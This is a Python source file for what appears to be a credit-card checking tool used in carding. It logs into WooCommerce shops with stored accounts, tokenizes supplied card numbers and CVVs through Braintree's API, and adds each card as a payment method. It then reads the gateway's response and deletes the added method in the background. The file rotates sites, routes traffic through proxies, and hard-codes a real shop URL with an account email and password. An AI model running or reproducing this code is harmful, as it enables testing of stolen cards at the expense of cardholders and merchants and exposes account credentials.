                r1 = make_request_with_proxy_fallback(r, 'GET', login_url, user_id=user_id, use_proxy=use_proxy, headers=headers, verify=False, allow_redirects=True)
                nonce = None
                for pattern in nonce_patterns:
                    match = re.search(pattern, r1.text)
                    if match:
                        nonce = match.group(1)
                        break
                if nonce:
                    login_data['woocommerce-login-nonce'] = nonce
                    continue
            else:
                # All retries failed
                print("All login attempts failed")
                return "DECLINED: Site login failed - check if has captcha or verify credentials"
        else:
            # Login successful
            login_success = True
            break
    
    if not login_success:
        return "DECLINED: Site login failed - check if has captcha or verify credentials"
    
    print("Login successful!")
    
    headers.pop('content-type', None)
    headers.pop('origin', None)
    
    print("Fetching payment method page...")
    r3 = make_request_with_proxy_fallback(r, 'GET', f'{site}/my-account/add-payment-method/', user_id=user_id, use_proxy=use_proxy, cookies=r.cookies, headers=headers, verify=False, allow_redirects=True)
    
    # Check if we got redirected back to login
    if 'woocommerce-login-nonce' in r3.text or 'login' in r3.url.lower():
        print("ERROR: Not logged in - redirected to login page")
        print(f"Final URL: {r3.url}")
        return "DECLINED: Site login failed - check if has captcha or verify credentials"
    
    payment_nonce_patterns = [
        r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
        r'id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"',
        r'"woocommerce-add-payment-method-nonce".*?value="([^"]+)"',
        r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']',
        r'woocommerce-add-payment-method-nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']'
    ]
    
    noncec = None
    for pattern in payment_nonce_patterns:
        match = re.search(pattern, r3.text)
        if match:
            noncec = match.group(1)
            break
    
    if not noncec:
        print("Payment method nonce not found!")
        print(f"Response URL: {r3.url}")
        print(f"Response length: {len(r3.text)}")
        # Check if we're on login page
        if 'woocommerce-login-nonce' in r3.text:
            print("Still on login page - login may have failed")
        return False
    
    print(f"Got add payment method nonce: {noncec}")
    
    token = get_client_token_multiple_methods(r, site, r3.text, headers, user_id=user_id, use_proxy=use_proxy)
    
    if not token:
        print("Failed to get client token!")
        return False
    
    braintree_headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {token}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': '''
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        cardholderName
                        expirationMonth
                        expirationYear
                        binData {
                            prepaid
                            healthcare
                            debit
                            durbinRegulated
                            commercial
                            payroll
                            issuingBank
                            countryOfIssuance
                            productId
                        }
                    }
                }
            }
        ''',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': postal_code,
                        'streetAddress': address,
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    print("Tokenizing credit card...")
    r4 = make_request_with_proxy_fallback(r, 'POST', 'https://payments.braintree-api.com/graphql', user_id=user_id, use_proxy=use_proxy,
                headers=braintree_headers, json=json_data, verify=False)
    
    try:
        response_json = r4.json()
        if 'data' in response_json and 'tokenizeCreditCard' in response_json['data']:
            if 'token' in response_json['data']['tokenizeCreditCard']:
                tok = response_json['data']['tokenizeCreditCard']['token']
                print(f"Got tokenized credit card: {tok}")
            else:
                # Check for errors in the response
                errors = response_json.get('errors', [])
                if errors:
                    error_msg = errors[0].get('message', 'Unknown error')
                    print(f"Braintree tokenization error: {error_msg}")
                    return f"DECLINED: {error_msg}"
                print("Failed to tokenize credit card - no token in response")
                print(r4.text)
                return "DECLINED: Card tokenization failed"
        else:
            # Check for errors at top level
            errors = response_json.get('errors', [])
            if errors:
                error_msg = errors[0].get('message', 'Unknown error')
                print(f"Braintree API error: {error_msg}")
                return f"DECLINED: {error_msg}"
            print("Failed to tokenize credit card - unexpected response format")
            print(r4.text)
            return "DECLINED: Card tokenization failed"
    except KeyError as e:
        print(f"Failed to tokenize credit card - missing key: {e}")
        print(r4.text)
        # Try to extract error from response
        try:
            response_json = r4.json()
            if 'errors' in response_json:
                error_msg = response_json['errors'][0].get('message', 'Unknown error')
                return f"DECLINED: {error_msg}"
        except:
            pass
        return "DECLINED: Card tokenization failed"
    except Exception as e:
        print(f"Failed to tokenize credit card: {e}")
        print(r4.text)
        # Try to extract error from response
        try:
            response_json = r4.json()
            if 'errors' in response_json:
                error_msg = response_json['errors'][0].get('message', 'Unknown error')
                return f"DECLINED: {error_msg}"
            # Check for error messages in the response text
            if 'invalid' in r4.text.lower() or 'error' in r4.text.lower():
                # Try to extract JSON error
                import json
                try:
                    error_data = json.loads(r4.text)
                    if isinstance(error_data, dict):
                        for key, value in error_data.items():
                            if 'error' in key.lower() or 'message' in key.lower() or 'invalid' in key.lower():
                                if isinstance(value, str):
                                    return f"DECLINED: {value}"
                                elif isinstance(value, dict):
                                    for k, v in value.items():
                                        if isinstance(v, str):
                                            return f"DECLINED: {v}"
                except:
                    pass
        except:
            pass
        return "DECLINED: Card tokenization failed"
    
    format_type = detect_site_payment_format(r3.text)
    print(f"Detected format: {format_type}")
    
    # Detect required billing fields (postal code, address, etc.)
    billing_fields = detect_required_billing_fields(r3.text)
    if billing_fields:
        print(f"Auto-detected and will fill {len(billing_fields)} billing field(s): {list(billing_fields.keys())}")
    else:
        print("No billing fields detected - will use default values if needed")
    
    sess = generate_random_code()
    corr = str(uuid.uuid4())
    device_data_simple, device_data_full = build_device_data(sess, corr)
    
    # Enhanced if-else logic to handle different site formats
    if format_type == 'format1':
        payment_data = build_payment_data_format1(tok, noncec, device_data_simple, billing_fields)
        print("Using format1 payment data structure")
    elif format_type == 'format2':
        # New path for sites using WooCommerce payment_method=braintree_credit_card
        if process_braintree_credit_card is not None:
            try:
                # Basic billing data; you can refine this or reuse detected fields
                billing = {
                    "first_name": "John",
                    "last_name": "Doe",
                    "company": "",
                    "address_1": billing_fields.get('billing_address_1', address),
                    "address_2": billing_fields.get('billing_address_2', ''),
                    "city": billing_fields.get('billing_city', "Test City"),
                    "state": billing_fields.get('billing_state', "TS"),
                    "zip": billing_fields.get('billing_postcode', postal_code),
                    "phone": "+10000000000",
                    "email": f"john.doe{random.randint(1000,9999)}@example.com",
                }
                print("[B3 credit card] Using braintree_credit_card gateway via wc-ajax=checkout")
                message, raw_json = process_braintree_credit_card(
                    base_url=site,
                    card=(card_number, exp_month, exp_year, cvv),
                    billing=billing,
                    country="US",
                    session=r,
                )
                print(f"[B3 credit card] Site message: {message}")
                return message
            except BraintreeCreditCardError as e:
                print(f"[B3 credit card] Gateway error: {e}, falling back to legacy format2")
            except Exception as e:
                print(f"[B3 credit card] Unexpected error: {e}, falling back to legacy format2")
        # Legacy format2 behaviour (old braintree_cc style)
        payment_data = build_payment_data_format2(tok, noncec, device_data_simple, billing_fields, r3.text)
        print("Using format2 payment data structure (legacy)")
    elif format_type == 'format3':
        config_data = extract_config_data(r3.text)
        if config_data:
            print(f"Found config data for format3: {config_data[:50]}...")
        else:
            print("No config data found, proceeding without it")
        payment_data = build_payment_data_format3(tok, noncec, device_data_full, config_data, billing_fields)
        print("Using format3 payment data structure")
    else:
        # Fallback: try format1 first, then format3 if format1 fails
        print(f"Unknown format type '{format_type}', trying format1 as fallback")
        payment_data = build_payment_data_format1(tok, noncec, device_data_simple, billing_fields)
    
    headers.update({
        'content-type': 'application/x-www-form-urlencoded',
        'origin': site,
    })
    
    print("Adding payment method...")
    r6 = make_request_with_proxy_fallback(r, 'POST', f'{site}/my-account/add-payment-method/', user_id=user_id, use_proxy=use_proxy,
                cookies=r.cookies, headers=headers, data=payment_data, verify=False)
    print("Response received, parsing results...")
    from bs4 import BeautifulSoup
    # --- Follow redirect if present ---
    if r6.status_code in (301, 302) or getattr(r6, 'is_redirect', False):
        redirect_url = r6.headers.get("Location")
        if redirect_url and not redirect_url.startswith("http"):
            redirect_url = site + redirect_url  # resolve relative path if needed
        r7 = make_request_with_proxy_fallback(r, 'GET', redirect_url, user_id=user_id, use_proxy=use_proxy, cookies=r.cookies, headers=headers, verify=False)
        html_to_parse = r7.text
    else:
        html_to_parse = r6.text

    soup = BeautifulSoup(html_to_parse, "html.parser")
    
    # Check for rate limiting message first (check both error and message divs)
    rate_limit_patterns = [
        r'cannot add a new payment method so soon',
        r'please wait.*?seconds',
        r'wait.*?before.*?adding',
        r'you cannot add.*?so soon'
    ]
    
    # Check in error messages
    error_ul = soup.find('ul', class_='woocommerce-error')
    if error_ul:
        error_text = error_ul.get_text().lower()
        for pattern in rate_limit_patterns:
            if re.search(pattern, error_text, re.IGNORECASE):
                rate_limit_msg = error_ul.get_text(strip=True)
                print(f"Rate limit detected in error: {rate_limit_msg[:200]}")
                return rate_limit_msg
    
    # Check in success/info messages
    message_div = soup.find('div', class_='woocommerce-message')
    if message_div:
        message_text = message_div.get_text().lower()
        for pattern in rate_limit_patterns:
            if re.search(pattern, message_text, re.IGNORECASE):
                rate_limit_msg = message_div.get_text(strip=True)
                print(f"Rate limit detected in message: {rate_limit_msg[:200]}")
                return rate_limit_msg
    
    # Check in full page text as fallback
    page_text = soup.get_text().lower()
    for pattern in rate_limit_patterns:
        if re.search(pattern, page_text, re.IGNORECASE):
            rate_limit_msg = soup.get_text()[:500]
            print(f"Rate limit detected in page: {rate_limit_msg[:200]}")
            return rate_limit_msg
    
    # --- Success (green) ---
    success_div = soup.find('div', class_='woocommerce-message')
    if success_div:
        success_message = success_div.get_text(strip=True)
        print(f"Success found: {success_message}")
        
        # Return success message first, then delete payment method in background
        # This ensures the result is sent even if deletion fails
        import threading
        def delete_in_background():
            try:
                delete_payment_method(r, site, headers, user_id=user_id, use_proxy=use_proxy)
            except Exception as e:
                print(f"Failed to delete payment method: {e}")
        
        # Start deletion in background thread (non-blocking)
        delete_thread = threading.Thread(target=delete_in_background)
        delete_thread.daemon = True
        delete_thread.start()
        
        # Return immediately so result can be sent
        return success_message
    # --- Error (red) ---
    error_ul = soup.find('ul', class_='woocommerce-error')
    if error_ul:
        error_lines = [li.get_text(strip=True) for li in error_ul.find_all('li')]
        error_message = ' | '.join(error_lines) if error_lines else error_ul.get_text(strip=True)
        
        # Check if error message contains "Reason:" - if so, extract only the reason part
        reason_match = re.search(r'Reason:\s*(.+?)(?:\s*\||$)', error_message, re.IGNORECASE)
        if reason_match:
            error_message = reason_match.group(1).strip()
        # If no "Reason:" found, return the error message as-is (could be "invalid", "declined", etc.)
        
        if error_message:
            print(f"Error found: {error_message}")
            return error_message
    
    # Also check for error divs
    error_divs = soup.find_all(['div', 'p', 'span'], class_=re.compile(r'error|woocommerce-error', re.I))
    for error_div in error_divs:
        error_text = error_div.get_text(strip=True)
        if error_text:
            # Check if it contains "Reason:"
            reason_match = re.search(r'Reason:\s*(.+?)(?:\s*\||$)', error_text, re.IGNORECASE)
            if reason_match:
                error_text = reason_match.group(1).strip()
            if error_text and len(error_text) < 500:  # Avoid returning huge blocks
                print(f"Error found in div: {error_text}")
                return error_text
    
    # --- Fallback: comprehensive error pattern matching ---
    # First, try to find structured error messages with "Reason:"
    reason_patterns = [
        r'Reason:\s*(.+?)(?:\s*\||</li>|$|</div>|</p>)',
        r'<ul[^>]*class=["\']woocommerce-error[^"\']*["\'][^>]*>.*?Reason:\s*(.+?)(?:</li>|</ul>)',
        r'<ul[^>]*class=["\']woocommerce-error-alert[^"\']*["\'][^>]*>.*?Reason:\s*(.+?)(?:</li>|</ul>)',
        r'<div[^>]*class=["\']woocommerce-error[^"\']*["\'][^>]*>.*?Reason:\s*(.+?)(?:</div>|$)',
    ]
    
    for pattern in reason_patterns:
        match = re.search(pattern, html_to_parse, re.DOTALL | re.IGNORECASE)
        if match:
            error_text = re.sub(r'<[^>]+>', '', match.group(1)).strip()
            if error_text:
                print(f"Error found (Reason pattern): {error_text}")
                return error_text
    
    # Then, try to find simple error keywords/messages (without "Reason:" prefix)
    simple_error_patterns = [
        r'<li[^>]*>(.*?(?:invalid|declined|failed|error|denied|rejected|insufficient|expired|incorrect|wrong)[^<]*)</li>',
        r'<div[^>]*class=["\']woocommerce-error[^"\']*["\'][^>]*>(.*?)</div>',
        r'<ul[^>]*class=["\']woocommerce-error[^"\']*["\'][^>]*>(.*?)</ul>',
        r'class=["\']woocommerce-error[^"\']*["\'][^>]*>([^<]+)',
    ]
    
    for pattern in simple_error_patterns:
        match = re.search(pattern, html_to_parse, re.DOTALL | re.IGNORECASE)
        if match:
            error_text = re.sub(r'<[^>]+>', '', match.group(1)).strip()
            # Clean up the text - remove extra whitespace and newlines
            error_text = ' '.join(error_text.split())
            if error_text and len(error_text) < 200:  # Avoid returning huge blocks
                # Check if it contains "Reason:" and extract it
                reason_match = re.search(r'Reason:\s*(.+?)(?:\s*\||$)', error_text, re.IGNORECASE)
                if reason_match:
                    error_text = reason_match.group(1).strip()
                print(f"Error found (simple pattern): {error_text}")
                return error_text
    
    # Check for JSON error responses embedded in HTML
    try:
        import json
        # Look for JSON objects in script tags or data attributes
        json_patterns = [
            r'\{[^{}]*"(?:invalid|error|message|declined|failed)"[^{}]*\}',
            r'"(?:invalid|error|message)":\s*"([^"]+)"',
            r'"(?:card_number|cardNumber)[^"]*":\s*"([^"]+)"',
        ]
        for pattern in json_patterns:
            matches = re.findall(pattern, html_to_parse, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    # Safely extract match value from tuple
                    if len(match) > 0:
                        # Try first element, if empty/falsy and we have a second, use that
                        match_value = match[0] if match[0] else (match[1] if len(match) > 1 and match[1] else '')
                    else:
                        match_value = ''
                    match = match_value
                if not match:
                    continue
                # If this looks like a full JSON object, try to parse it and
                # extract human‑readable fields instead of returning raw JSON.
                text = None
                trimmed = match.strip()
                if trimmed.startswith("{") and trimmed.endswith("}"):
                    try:
                        data = json.loads(trimmed)
                        if isinstance(data, dict):
                            # Skip generic label objects from plugins like
                            # wt-smart-coupon which only define UI labels
                            # (please_wait / choose_variation / error).
                            keys_set = set(k.lower() for k in data.keys())
                            if keys_set.issubset({"please_wait", "choose_variation", "error"}):
                                continue
                            parts = []
                            for key in ["message", "error", "please_wait", "choose_variation"]:
                                if key in data and isinstance(data[key], str) and data[key].strip():
                                    parts.append(data[key].strip())
                            if parts:
                                text = " | ".join(parts)
                    except Exception:
                        pass
                if not text:
                    text = match
                # Skip completely generic "Error !!!" strings that come from
                # label configs and are not real gateway responses.
                if text and text.strip().lower() == "error !!!":
                    continue
                if text and len(text) < 200:
                    print(f"Error found (JSON pattern): {text}")
                    return text
        
        # Try to find and parse JSON blocks
        json_blocks = re.findall(r'\{[^{}]*"invalid"[^{}]*\}', html_to_parse, re.IGNORECASE)
        for json_block in json_blocks:
            try:
                error_data = json.loads(json_block)
                if isinstance(error_data, dict):
                    for key, value in error_data.items():
                        if 'invalid' in key.lower() or 'error' in key.lower() or 'message' in key.lower():
                            if isinstance(value, str) and value:
                                print(f"Error found (JSON block): {value}")
                                return value
                            elif isinstance(value, dict):
                                for k, v in value.items():
                                    if isinstance(v, str) and v:
                                        print(f"Error found (JSON nested): {v}")
                                        return v
            except:
                continue
    except:
        pass
    
    # Last resort: search for common error keywords in the page text
    page_text_lower = html_to_parse.lower()
    error_keywords = {
        'invalid': 'invalid',
        'declined': 'declined',
        'failed': 'failed',
        'denied': 'denied',
        'rejected': 'rejected',
        'insufficient funds': 'insufficient funds',
        'expired': 'expired',
        'incorrect': 'incorrect',
        'payment method was not added': 'Payment method was not added',
        'card number is invalid': 'Card number is invalid',
        'card_number_digits_inv': 'Card number is invalid',
    }
    
    for keyword, error_msg in error_keywords.items():
        if keyword in page_text_lower:
            # Try to find the context around the keyword
            keyword_index = page_text_lower.find(keyword)
            context_start = max(0, keyword_index - 50)
            context_end = min(len(html_to_parse), keyword_index + len(keyword) + 100)
            context = html_to_parse[context_start:context_end]
            # Extract clean text
            context_clean = re.sub(r'<[^>]+>', '', context).strip()
            context_clean = ' '.join(context_clean.split())
            if context_clean:
                # Check if it contains "Reason:"
                reason_match = re.search(r'Reason:\s*(.+?)(?:\s*\||$)', context_clean, re.IGNORECASE)
                if reason_match:
                    error_text = reason_match.group(1).strip()
                else:
                    # Extract just the relevant part with the keyword
                    keyword_pos = context_clean.lower().find(keyword)
                    if keyword_pos >= 0:
                        error_text = context_clean[keyword_pos:keyword_pos+len(keyword)+50].strip()
                        # Remove everything after first sentence or 100 chars
                        error_text = re.split(r'[\.\|\n]', error_text)[0].strip()[:100]
                    else:
                        error_text = error_msg
                if error_text:
                    print(f"Error found (keyword search): {error_text}")
                    return error_text
    
    # Final fallback: return a portion of the response for debugging
    print("Result unclear, checking response...")
    print(html_to_parse[:500])
    return "DECLINED: Unable to parse error response"

def delete_payment_method(session, site, headers, user_id=None, use_proxy=True):
    """Delete the most recently added payment method from the account."""
    print("Deleting payment method...")
    
    # Navigate to payment methods page
    payment_methods_url = f'{site}/my-account/payment-methods/'
    r_pm = make_request_with_proxy_fallback(session, 'GET', payment_methods_url, user_id=user_id, use_proxy=use_proxy, cookies=session.cookies, headers=headers, verify=False, allow_redirects=True)
    
    # Check if we got redirected to login
    if 'woocommerce-login-nonce' in r_pm.text or 'login' in r_pm.url.lower():
        print("ERROR: Not logged in - cannot delete payment method")
        return False
    
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(r_pm.text, "html.parser")
    
    # Find all delete links - they have href contains "delete-payment-method"
    delete_links = soup.find_all('a', href=re.compile(r'delete-payment-method'))
    
    if not delete_links:
        # Try alternative selector - look for buttons with delete class
        delete_links = soup.find_all('a', class_=re.compile(r'delete|button'))
        delete_links = [link for link in delete_links if 'delete' in link.get('href', '').lower()]
    
    if not delete_links:
        print("No payment methods found to delete")
        return False
    
    # Get the first delete link (most recent payment method)
    delete_link = delete_links[0]
    delete_url = delete_link.get('href', '')
    
    if not delete_url:
        print("No delete URL found")
        return False
    
    # Make sure URL is absolute
    if not delete_url.startswith('http'):
        if delete_url.startswith('/'):
            delete_url = site + delete_url
        else:
            delete_url = f'{site}/{delete_url}'
    
    print(f"Deleting payment method at: {delete_url}")
    
    # Follow the delete link (GET request)
    r_delete = make_request_with_proxy_fallback(session, 'GET', delete_url, user_id=user_id, use_proxy=use_proxy, cookies=session.cookies, headers=headers, verify=False, allow_redirects=True)
    
    # Check if deletion was successful
    if r_delete.status_code == 200:
        delete_soup = BeautifulSoup(r_delete.text, "html.parser")
        success_msg = delete_soup.find('div', class_='woocommerce-message')
        if success_msg:
            print(f"Payment method deleted: {success_msg.get_text(strip=True)}")
            return True
        else:
            print("Delete request completed, but success message not found")
            return True
    else:
        print(f"Delete request failed with status: {r_delete.status_code}")
        return False

def universal_braintree_checker(site, username, password, card_number, exp_month, exp_year, cvv, postal_code='NP12 1AE', address='84 High St', user_id=None):
    """
    Wrapper function that auto-retries with direct IP if proxy errors occur.
    """
    # Check if user has proxy configured
    has_proxy = get_user_proxy(user_id) is not None if user_id else False
    
    # If user has proxy, try with proxy first
    if has_proxy:
        try:
            print(f"[Proxy Mode] Attempting card check with proxy for user {user_id}")
            result = universal_braintree_checker_internal(
                site, username, password, card_number, exp_month, exp_year, cvv,
                postal_code, address, user_id, use_proxy=True
            )
            return result
        except (ConnectionError, Timeout, ProxyError, SSLError, RequestException, 
                ConnectTimeout, ReadTimeout, TooManyRedirects) as e:
            # Proxy/connection error occurred, retry with direct IP
            print(f"[Proxy Error] {type(e).__name__}: {str(e)}")
            print(f"[Auto-Retry] Retrying card check with direct IP (no proxy) for user {user_id}")
            try:
                result = universal_braintree_checker_internal(
                    site, username, password, card_number, exp_month, exp_year, cvv,
                    postal_code, address, user_id, use_proxy=False
                )
                return result
            except Exception as retry_error:
                # Even direct IP failed, return the error
                print(f"[Direct IP Error] {type(retry_error).__name__}: {str(retry_error)}")
                raise retry_error
        except Exception as e:
            # Other exceptions - these are unexpected errors, retry with direct IP
            # Note: Natural errors (like login failed, card declined) are returned as False or strings,
            # not raised as exceptions, so we don't need to check for them here
            print(f"[Unexpected Error] {type(e).__name__}: {str(e)}")
            print(f"[Auto-Retry] Retrying card check with direct IP (no proxy) for user {user_id}")
            try:
                result = universal_braintree_checker_internal(
                    site, username, password, card_number, exp_month, exp_year, cvv,
                    postal_code, address, user_id, use_proxy=False
                )
                return result
            except Exception as retry_error:
                print(f"[Direct IP Error] {type(retry_error).__name__}: {str(retry_error)}")
                raise retry_error
    
    # No proxy configured, use direct connection
    return universal_braintree_checker_internal(
        site, username, password, card_number, exp_month, exp_year, cvv,
        postal_code, address, user_id, use_proxy=False
    )

def split_cc_details(card_line):
    """
    Parses card line into tuple for process_cc.
    Supports formats:
    - '1234567890123456|12|2027|123' (standard format with 4-digit year)
    - '1234567890123456|12|27|123' (standard format with 2-digit year, auto-converted to 2027)
    - '1234567890123456 12|2027|123' (with space before expiry)
    - '1234567890123456:12:2027:123' (with colons)
    """
    # Replace colons with pipes for consistent parsing
    card_line = card_line.replace(':', '|')
    
    # Handle format with space: "card_number MM|YYYY|CVV" -> split by space first, then by pipe
    if ' ' in card_line and '|' in card_line:
        # Check if space comes before the first pipe (format: "card MM|YYYY|CVV")
        space_idx = card_line.find(' ')
        pipe_idx = card_line.find('|')
        if space_idx < pipe_idx:
            # Format: "card_number MM|YYYY|CVV"
            parts = card_line.split(' ', 1)  # Split only on first space
            card_number = parts[0].strip()
            # Parse the remaining part (MM|YYYY|CVV) by pipe
            remaining_parts = [x.strip() for x in parts[1].split('|')]
            if len(remaining_parts) == 3:
                exp_month, exp_year, cvv = remaining_parts
                # Convert 2-digit year to 4-digit year if needed
                if len(exp_year) == 2:
                    exp_year = "20" + exp_year
                return (card_number, exp_month, exp_year, cvv)
    
    # Standard format: split by pipe
    parts = [x.strip() for x in card_line.split('|')]
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Expected CC|MM|YYYY|CVV or CC MM|YYYY|CVV.")
    
    # Convert 2-digit year to 4-digit year if needed
    card_number, exp_month, exp_year, cvv = parts
    if len(exp_year) == 2:
        # Convert 2-digit year to 4-digit (assume 20XX for years 00-99)
        exp_year = "20" + exp_year
    
    return (card_number, exp_month, exp_year, cvv)

def process_cc(cc_details, user_id=None):
    """
    Receives tuple (card_number, exp_month, exp_year, cvv)
    Runs the universal_braintree_checker and returns the resulting HTML/text RESPONSE
    If user_id is provided, uses user's site configuration, otherwise uses default from config
    """
    card_number, exp_month, exp_year, cvv = cc_details
    
    if user_id:
        # Get user's site configuration
        from site_config import get_user_site_config
        user_sites = get_user_site_config(user_id)
        if user_sites and len(user_sites) > 0:
            # Use round-robin to select site
            # Get or create round-robin index for this user
            if not hasattr(process_cc, '_user_site_index'):
                process_cc._user_site_index = {}
            if user_id not in process_cc._user_site_index:
                process_cc._user_site_index[user_id] = 0
            
            # Get current index and increment for next time
            current_index = process_cc._user_site_index[user_id]
            # Ensure index is within bounds (in case user_sites was modified)
            if current_index >= len(user_sites):
                current_index = 0
                process_cc._user_site_index[user_id] = 0
            site_config = user_sites[current_index]
            process_cc._user_site_index[user_id] = (current_index + 1) % len(user_sites)
            
            site = site_config.get("site", config.DEFAULT_SITE)
            username = site_config.get("email", config.DEFAULT_EMAIL)
            password = site_config.get("password", config.DEFAULT_PASSWORD)
        else:
            # Fallback to defaults
            site = config.DEFAULT_SITE
            username = config.DEFAULT_EMAIL
            password = config.DEFAULT_PASSWORD
    else:
        # Use defaults from config
        site = config.DEFAULT_SITE
        username = config.DEFAULT_EMAIL
        password = config.DEFAULT_PASSWORD
    
    # Check user mode preference - use get_user_mode from main.py to read from userdata folder
    user_mode = "login"  # default
    if user_id:
        try:
            from main import get_user_mode
            user_mode = get_user_mode(user_id)
        except ImportError:
            # Fallback if main.py not available - default to login
            print("Warning: Could not import get_user_mode from main.py, defaulting to login mode")
            user_mode = "login"
        except Exception as e:
            # Default to login if error
            print(f"Error getting user mode: {e}, defaulting to login")
            user_mode = "login"
    
    # Use cookie checker if mode is cookie, otherwise use login checker
    if user_mode == "cookie":
        # For cookie mode, get site from cookie file instead of site config
        cookie_site = None
        if user_id:
            try:
                import json
                import os
                cookie_path = f"cookies/{user_id}/cookie_{user_id}.json"
                if os.path.exists(cookie_path):
                    with open(cookie_path, "r", encoding="utf-8") as f:
                        cookie_data = json.load(f)
                        if isinstance(cookie_data, dict) and "site" in cookie_data:
                            cookie_site = cookie_data.get("site", "").strip()
            except Exception as e:
                print(f"Error loading site from cookie file: {e}")
        
        # Use site from cookie file if available, otherwise use site from config
        if cookie_site:
            site = cookie_site
            print(f"Using site from cookie file: {site}")
        
        from cookieb3 import universal_braintree_checker as cookie_checker
        return cookie_checker(site, username, password, card_number, exp_month, exp_year, cvv, user_id=user_id)
    else:
        return universal_braintree_checker(site, username, password, card_number, exp_month, exp_year, cvv, user_id=user_id)

if __name__ == "__main__":
    print("Enter CC details in format: cc|mm|yyyy|cvv")
    cc_input = input("CC Details: ").strip()
    try:
        card_number, exp_month, exp_year, cvv = cc_input.split("|")
    except:
        print("Invalid format! Please use: CCNUMBER|MM|YYYY|CVV")
        exit()
    site = "https://outlet.lagunatools.com"
    username = "desireeproductive@2200freefonts.com"
    password = "Neljane143"
    result = universal_braintree_checker(site, username, password, card_number, exp_month, exp_year, cvv)
    print(f"Final result: {result}")
